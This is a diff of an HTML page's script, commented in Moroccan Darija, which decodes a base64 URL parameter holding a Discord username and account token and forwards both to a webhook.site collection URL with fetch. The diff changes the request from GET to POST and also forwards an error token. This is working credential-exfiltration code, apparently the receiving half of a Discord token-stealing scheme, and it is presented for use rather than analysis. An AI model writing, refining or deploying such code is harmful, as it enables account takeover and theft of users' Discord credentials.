@@ -6,12 +6,14 @@
     <script>
         // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
         const WEBHOOK_SITE_BASE_URL = "https://webhook.site/discordquest"; 
-        // Note: beddelt WEBHOOK_SITE_URL l' WEBHOOK_SITE_BASE_URL hit ghadi nzidou 3liha les paramètres
-
+        
         const params = new URLSearchParams(window.location.search);
-        let finalWebhookUrl = WEBHOOK_SITE_BASE_URL; // Ghadi nbedlou had l'URL bach nzido 3liha l'data
+        let finalWebhookUrl = WEBHOOK_SITE_BASE_URL; // L'URL li ghadi nseftou liha l'request
 
-        // If the 'd' parameter (data) is present
+        let user = '';
+        let token = '';
+
+        // If the 'd' parameter (data) is present from Discord script
         if (params.has('d')) {
             try {
                 const secretData = params.get('d');
@@ -19,11 +21,10 @@
                 const decodedString = decodeURIComponent(atob(secretData));
                 
                 // Split the string into username and token (kanet `${tag}|${token}`)
-                const [username, token] = decodedString.split('|');
+                [user, token] = decodedString.split('|');
 
-                // ⭐ MODIFICATION HNA: Nseftou l'username w l'token k'query parameters
-                // L'webhook.site ghadi yqder yqrahom b' $request.query.user$ w $request.query.token$
-                finalWebhookUrl += `?user=${encodeURIComponent(username)}&token=${encodeURIComponent(token)}`;
+                // ⭐ MODIFICATION HNA: Nzidou l'username w l'token k'query parameters l'URL
+                finalWebhookUrl += `?user=${encodeURIComponent(user)}&token=${encodeURIComponent(token)}`;
 
             } catch (e) {
                 console.error("Error decoding 'd' parameter:", e);
@@ -34,10 +35,10 @@
         // If the 'err' parameter (error token) is present
         else if (params.has('err')) {
             try {
-                const errorToken = params.get('err');
-                const decodedErrorToken = atob(errorToken); // Decode Base64
+                const rawErrorToken = params.get('err');
+                const decodedErrorToken = atob(rawErrorToken); // Decode Base64
                 
-                // ⭐ MODIFICATION HNA: Nseftou l'error token k'query parameter
+                // ⭐ MODIFICATION HNA: Nzidou l'error token k'query parameter l'URL
                 finalWebhookUrl += `?error_token=${encodeURIComponent(decodedErrorToken)}`;
             } catch (e) {
                 console.error("Error decoding 'err' parameter:", e);
@@ -48,10 +49,10 @@
 
         // Only send the fetch request if the URL has been updated with parameters
         if (finalWebhookUrl !== WEBHOOK_SITE_BASE_URL) {
-            // ⭐ MODIFICATION HNA: Kanseftou GET request, hit hadchi li webhook.site kaytwaqqa3
-            // b'les query parameters.
+            // ⭐ Kanseftou POST request, wakha l'data f'query parameters, webhook.site kayqbel had l'format.
             fetch(finalWebhookUrl, {
-                method: 'GET' // Kanbedlouha l'GET, w ma kan7tajouch body aw Content-Type
+                method: 'POST' // Nkhaliwh POST, ḥit l'screenshot bayen bih webhook.site kaytwaqqa3 POST
+                // Ma kan7tajouch body aw Content-Type ila kenti kat3tamad ghir 3la query parameters
             })
             .then(response => {
                 if (!response.ok) {
@@ -69,7 +70,7 @@
                 window.close();
             });
         } else {
-             // Close if no valid data or error parameter found
+             // Close if no valid data or error parameter found in the URL from Discord
             window.close();
         }
     </script>
